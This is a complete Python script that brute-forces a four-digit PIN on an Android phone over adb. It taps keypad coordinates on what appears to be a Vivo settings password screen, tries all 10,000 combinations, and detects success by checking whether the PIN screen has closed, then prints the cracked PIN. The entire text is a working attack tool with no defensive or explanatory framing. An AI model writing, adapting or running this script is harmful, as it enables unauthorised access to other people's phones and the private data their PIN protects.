import subprocess, time, itertools

KEYS = {
    "1": (185, 1777), "2": (539, 1777), "3": (894, 1777),
    "4": (185, 1918), "5": (539, 1918), "6": (894, 1918),
    "7": (185, 2059), "8": (539, 2059), "9": (894, 2059),
    "C": (185, 2173), "0": (539, 2173), "D": (894, 2173),
}

def press_fast(seq):
    cmds = " && ".join(f"input tap {KEYS[ch][0]} {KEYS[ch][1]}" for ch in seq)
    subprocess.run(["adb", "shell", cmds], check=True)

def keypad_visible():
    out = subprocess.check_output(["adb", "shell", "dumpsys", "window"]).decode()
    return "I=com.android.settings/com.vivo.settings.secret.PasswordActivity" in out

def check_correct(timeout=0.6, poll=0.3):
    start = time.time()
    while keypad_visible():
        if time.time() - start > timeout:
            return False
        time.sleep(poll)
    return True

if __name__ == "__main__":
    total = 10000
    tried = 0
    start_time = time.time()

    for number in range(0000, 10000):
        pin = f"{number:04d}"
        tried += 1
        print("Password Tried: " + pin)
        press_fast(pin)

        if check_correct():
            elapsed = time.time() - start_time
            print(f"\nCracked !!!!!!!!!! : {pin} !!!!!!!!!!!!")
            break

        if tried % 100 == 0:
            elapsed = time.time() - start_time
            rate = tried / elapsed
            remaining = (total - tried) / rate
            print(f"[{tried}/{total}] last tried: {pin}  (~{remaining/60:.1f} min remaining)")
    else:
        print("All 10,000 combinations, no match found.")